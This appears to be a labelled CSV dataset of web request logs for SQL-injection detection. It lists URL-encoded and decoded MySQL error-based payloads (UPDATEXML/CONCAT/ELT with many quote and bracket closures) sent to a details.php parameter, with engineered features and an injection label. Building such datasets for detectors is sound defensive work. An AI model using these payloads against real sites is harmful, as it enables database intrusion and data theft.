full_url,parsed_url,hostname,event_time,sql_keyword,params_length,request_volume,special_chars,values_to_length,injection
/details.php?prod=5&type=%3F%22%29%29%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%20AND%20%28%28%22RaZd%22%20LIKE%20%22RaZd,"/details.php?prod=5&type=?"")) AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962) AND ((""RaZd"" LIKE ""RaZd",192.168.43.6,1681395138.143896,4,121,106.8,5,7.43801652892562,1
/details.php?prod=5&type=%3F%22%29%29%29%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%20AND%20%28%28%28%22MtdA%22%20LIKE%20%22MtdA,"/details.php?prod=5&type=?""))) AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962) AND (((""MtdA"" LIKE ""MtdA",192.168.43.6,1681395138.149087,4,123,106.8,5,7.317073170731708,1
/details.php?prod=5&type=%3F%22%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%20AND%20%22JsGH%22%20LIKE%20%22JsGH,"/details.php?prod=5&type=?"" AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962) AND ""JsGH"" LIKE ""JsGH",192.168.43.6,1681395138.153629,4,117,106.8,5,7.6923076923076925,1
/details.php?prod=5&type=%3F%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29--%20OfcY,"/details.php?prod=5&type=? AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962)-- OfcY",192.168.43.6,1681395138.158602,3,101,106.8,5,7.920792079207921,1
/details.php?prod=5&type=%3F%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%23%20Uykv,"/details.php?prod=5&type=? AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962)# Uykv",192.168.43.6,1681395138.16326,3,100,106.8,5,8.0,1
/details.php?prod=5&type=%3F%27%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%20OR%20%27hulT%27%3D%27qUGZ,"/details.php?prod=5&type=?' AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962) OR 'hulT'='qUGZ",192.168.43.6,1681395138.167916,4,111,106.8,5,8.108108108108109,1
/details.php?prod=5&type=%3F%27%29%20WHERE%206006%3D6006%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29--%20NDaF,"/details.php?prod=5&type=?') WHERE 6006=6006 AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962)-- NDaF",192.168.43.6,1681395138.172928,4,119,106.8,6,8.403361344537815,1
/details.php?prod=5&type=%3F%22%29%20WHERE%208930%3D8930%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29--%20QBFM,"/details.php?prod=5&type=?"") WHERE 8930=8930 AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962)-- QBFM",192.168.43.6,1681395138.177092,4,119,106.8,6,8.403361344537815,1
/details.php?prod=5&type=%3F%29%20WHERE%209210%3D9210%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29--%20VXPs,"/details.php?prod=5&type=?) WHERE 9210=9210 AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962)-- VXPs",192.168.43.6,1681395138.182175,4,118,106.8,5,7.627118644067797,1
/details.php?prod=5&type=%3F%27%20WHERE%204014%3D4014%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29--%20BZUF,"/details.php?prod=5&type=?' WHERE 4014=4014 AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962)-- BZUF",192.168.43.6,1681395138.187345,4,118,106.8,6,8.474576271186441,1
/details.php?prod=5&type=%3F%22%20WHERE%208924%3D8924%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29--%20USaC,"/details.php?prod=5&type=?"" WHERE 8924=8924 AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962)-- USaC",192.168.43.6,1681395138.193019,4,118,106.8,6,8.474576271186441,1
/details.php?prod=5&type=%3F%20WHERE%204429%3D4429%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29--%20Vpwf,"/details.php?prod=5&type=? WHERE 4429=4429 AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962)-- Vpwf",192.168.43.6,1681395138.197378,4,117,106.8,5,7.6923076923076925,1
/details.php?prod=5&type=%3F%27%7C%7C%28SELECT%200x61764871%20WHERE%208601%3D8601%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%29%7C%7C%27,"/details.php?prod=5&type=?'||(SELECT 0x61764871 WHERE 8601=8601 AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962))||'",192.168.43.6,1681395138.202171,4,135,106.8,5,6.666666666666667,1
/details.php?prod=5&type=%3F%27%7C%7C%28SELECT%200x6c734449%20FROM%20DUAL%20WHERE%209933%3D9933%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%29%7C%7C%27,"/details.php?prod=5&type=?'||(SELECT 0x6c734449 FROM DUAL WHERE 9933=9933 AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962))||'",192.168.43.6,1681395138.20701,5,145,106.8,5,6.896551724137931,1
/details.php?prod=5&type=%3F%27%2B%28SELECT%200x4d797067%20WHERE%204466%3D4466%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%29%2B%27,"/details.php?prod=5&type=?'+(SELECT 0x4d797067 WHERE 4466=4466 AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962))+'",192.168.43.6,1681395138.212571,4,133,106.8,5,6.7669172932330826,1
/details.php?prod=5&type=%3F%7C%7C%28SELECT%200x7865474d%20FROM%20DUAL%20WHERE%207433%3D7433%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%29%7C%7C,"/details.php?prod=5&type=?||(SELECT 0x7865474d FROM DUAL WHERE 7433=7433 AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962))||",192.168.43.6,1681395138.217474,5,143,106.8,4,6.293706293706293,1
/details.php?prod=5&type=%3F%7C%7C%28SELECT%200x5856766b%20WHERE%203489%3D3489%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%29%7C%7C,"/details.php?prod=5&type=?||(SELECT 0x5856766b WHERE 3489=3489 AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962))||",192.168.43.6,1681395138.222024,4,133,106.8,4,6.015037593984962,1
/details.php?prod=5&type=%3F%2B%28SELECT%20fcZH%20WHERE%203969%3D3969%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%29%2B,"/details.php?prod=5&type=?+(SELECT fcZH WHERE 3969=3969 AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962))+",192.168.43.6,1681395138.226916,4,125,106.8,4,6.4,1
/details.php?prod=5&type=%3F%2B%28SELECT%200x49687476%20WHERE%208847%3D8847%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%29%2B,"/details.php?prod=5&type=?+(SELECT 0x49687476 WHERE 8847=8847 AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962))+",192.168.43.6,1681395138.231701,4,131,106.8,4,6.106870229007634,1
/details.php?prod=5&type=%3F%27%29%29%20AS%20AAqi%20WHERE%208501%3D8501%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29--%20qkGH,"/details.php?prod=5&type=?')) AS AAqi WHERE 8501=8501 AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962)-- qkGH",192.168.43.6,1681395138.235757,5,128,106.8,6,8.59375,1
/details.php?prod=5&type=%3F%22%29%29%20AS%20xaCt%20WHERE%206671%3D6671%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29--%20eSmc,"/details.php?prod=5&type=?"")) AS xaCt WHERE 6671=6671 AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962)-- eSmc",192.168.43.6,1681395138.240758,5,128,106.8,6,8.59375,1
/details.php?prod=5&type=%3F%29%29%20AS%20uktp%20WHERE%204362%3D4362%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29--%20CbmV,"/details.php?prod=5&type=?)) AS uktp WHERE 4362=4362 AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962)-- CbmV",192.168.43.6,1681395138.245581,5,127,106.8,5,7.874015748031496,1
/details.php?prod=5&type=%3F%27%29%20AS%20RJkR%20WHERE%209722%3D9722%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29--%20ONqv,"/details.php?prod=5&type=?') AS RJkR WHERE 9722=9722 AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962)-- ONqv",192.168.43.6,1681395138.250011,5,127,106.8,6,8.661417322834646,1
/details.php?prod=5&type=%3F%22%29%20AS%20pLxr%20WHERE%205597%3D5597%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29--%20VFSW,"/details.php?prod=5&type=?"") AS pLxr WHERE 5597=5597 AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962)-- VFSW",192.168.43.6,1681395138.254639,5,127,106.8,6,8.661417322834646,1
/details.php?prod=5&type=%3F%29%20AS%20Qeic%20WHERE%203260%3D3260%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29--%20gKwi,"/details.php?prod=5&type=?) AS Qeic WHERE 3260=3260 AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962)-- gKwi",192.168.43.6,1681395138.258769,5,126,106.8,5,7.936507936507937,1
/details.php?prod=5&type=%3F%60%20WHERE%203270%3D3270%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29--%20xTbO,"/details.php?prod=5&type=?` WHERE 3270=3270 AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962)-- xTbO",192.168.43.6,1681395138.263531,4,118,106.8,5,7.627118644067797,1
/details.php?prod=5&type=%3F%60%29%20WHERE%208163%3D8163%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29--%20JWvm,"/details.php?prod=5&type=?`) WHERE 8163=8163 AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962)-- JWvm",192.168.43.6,1681395138.268298,4,119,106.8,5,7.563025210084033,1
/details.php?prod=5&type=%3F%60%3D%60%3F%60%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%20AND%20%60%3F%60%3D%60%3F,"/details.php?prod=5&type=?`=`?` AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962) AND `?`=`?",192.168.43.6,1681395138.272359,3,110,106.8,4,6.363636363636363,1
/details.php?prod=5&type=%3F%22%3D%22%3F%22%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%20AND%20%22%3F%22%3D%22%3F,"/details.php?prod=5&type=?""=""?"" AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962) AND ""?""=""?",192.168.43.6,1681395138.276919,3,110,106.8,5,7.2727272727272725,1
/details.php?prod=5&type=%3F%5D-%28SELECT%200%20WHERE%202582%3D2582%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%29%7C%5B%3F,"/details.php?prod=5&type=?]-(SELECT 0 WHERE 2582=2582 AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962))|[?",192.168.43.6,1681395138.28128,4,125,106.8,4,6.4,1
/details.php?prod=5&type=%3F%27%20IN%20BOOLEAN%20MODE%29%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%23,"/details.php?prod=5&type=?' IN BOOLEAN MODE) AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962)#",192.168.43.6,1681395138.285329,4,113,106.8,6,8.849557522123893,1
/details.php?prod=5&type=%3F%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20xGZg,"/details.php?prod=5&type=?) OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- xGZg",192.168.43.6,1681395138.290294,3,101,106.8,5,7.920792079207921,1
/details.php?prod=5&type=%3F%27%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20QeGg,"/details.php?prod=5&type=?') OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- QeGg",192.168.43.6,1681395138.294579,3,102,93.6,6,8.823529411764707,1
/details.php?prod=5&type=%3F%27%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20UQDG,"/details.php?prod=5&type=?' OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- UQDG",192.168.43.6,1681395138.299088,3,101,93.6,6,8.910891089108912,1
/details.php?prod=5&type=%3F%22%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20qlyO,"/details.php?prod=5&type=?"" OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- qlyO",192.168.43.6,1681395138.318784,3,101,93.6,6,8.910891089108912,1
/details.php?prod=5&type=%3F%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%281568%3D1568,"/details.php?prod=5&type=?) OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND (1568=1568",192.168.43.6,1681395138.323909,4,109,93.6,4,7.339449541284404,1
/details.php?prod=5&type=%3F%29%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%28%288170%3D8170,"/details.php?prod=5&type=?)) OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND ((8170=8170",192.168.43.6,1681395138.330693,4,111,93.6,4,7.207207207207207,1
/details.php?prod=5&type=%3F%29%29%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%28%28%288865%3D8865,"/details.php?prod=5&type=?))) OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND (((8865=8865",192.168.43.6,1681395138.410081,4,113,93.6,4,7.079646017699115,1
/details.php?prod=5&type=%3F%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29,"/details.php?prod=5&type=? OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)",192.168.43.6,1681395138.476267,3,93,93.6,4,7.526881720430108,1
/details.php?prod=5&type=%3F%27%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%28%27gLjd%27%3D%27gLjd,"/details.php?prod=5&type=?') OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND ('gLjd'='gLjd",192.168.43.6,1681395138.481931,4,113,93.6,5,7.964601769911504,1
/details.php?prod=5&type=%3F%27%29%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%28%28%27tmGp%27%3D%27tmGp,"/details.php?prod=5&type=?')) OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND (('tmGp'='tmGp",192.168.43.6,1681395138.487121,4,115,93.6,5,7.826086956521739,1
/details.php?prod=5&type=%3F%27%29%29%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%28%28%28%27aDPb%27%3D%27aDPb,"/details.php?prod=5&type=?'))) OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND ((('aDPb'='aDPb",192.168.43.6,1681395138.492453,4,117,93.6,5,7.6923076923076925,1
/details.php?prod=5&type=%3F%27%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%27YMiY%27%3D%27YMiY,"/details.php?prod=5&type=?' OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND 'YMiY'='YMiY",192.168.43.6,1681395138.552069,4,111,93.6,5,8.108108108108109,1
/details.php?prod=5&type=%3F%27%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%28%27qWmq%27%20LIKE%20%27qWmq,"/details.php?prod=5&type=?') OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND ('qWmq' LIKE 'qWmq",192.168.43.6,1681395138.556421,5,118,93.6,5,8.474576271186441,1
/details.php?prod=5&type=%3F%27%29%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%28%28%27gzqf%27%20LIKE%20%27gzqf,"/details.php?prod=5&type=?')) OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND (('gzqf' LIKE 'gzqf",192.168.43.6,1681395138.561805,5,120,93.6,5,8.333333333333334,1
/details.php?prod=5&type=%3F%27%29%29%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%28%28%28%27SRQA%27%20LIKE%20%27SRQA,"/details.php?prod=5&type=?'))) OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND ((('SRQA' LIKE 'SRQA",192.168.43.6,1681395138.56602,5,122,93.6,5,8.19672131147541,1
/details.php?prod=5&type=%3F%25%27%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%27lLgW%25%27%3D%27lLgW,"/details.php?prod=5&type=?%' OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND 'lLgW%'='lLgW",192.168.43.6,1681395138.57064,4,113,93.6,5,7.964601769911504,1
/details.php?prod=5&type=%3F%27%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%27yrCJ%27%20LIKE%20%27yrCJ,"/details.php?prod=5&type=?' OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND 'yrCJ' LIKE 'yrCJ",192.168.43.6,1681395138.576369,5,116,93.6,5,8.620689655172415,1
/details.php?prod=5&type=%3F%22%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%28%22gnOT%22%3D%22gnOT,"/details.php?prod=5&type=?"") OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND (""gnOT""=""gnOT",192.168.43.6,1681395138.581259,4,113,93.6,5,7.964601769911504,1
/details.php?prod=5&type=%3F%22%29%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%28%28%22ovoG%22%3D%22ovoG,"/details.php?prod=5&type=?"")) OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND ((""ovoG""=""ovoG",192.168.43.6,1681395138.585741,4,115,93.6,5,7.826086956521739,1
/details.php?prod=5&type=%3F%22%29%29%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%28%28%28%22Hesg%22%3D%22Hesg,"/details.php?prod=5&type=?""))) OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND (((""Hesg""=""Hesg",192.168.43.6,1681395138.59039,4,117,93.6,5,7.6923076923076925,1
/details.php?prod=5&type=%3F%22%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%22DTiv%22%3D%22DTiv,"/details.php?prod=5&type=?"" OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND ""DTiv""=""DTiv",192.168.43.6,1681395138.595213,4,111,93.6,5,8.108108108108109,1
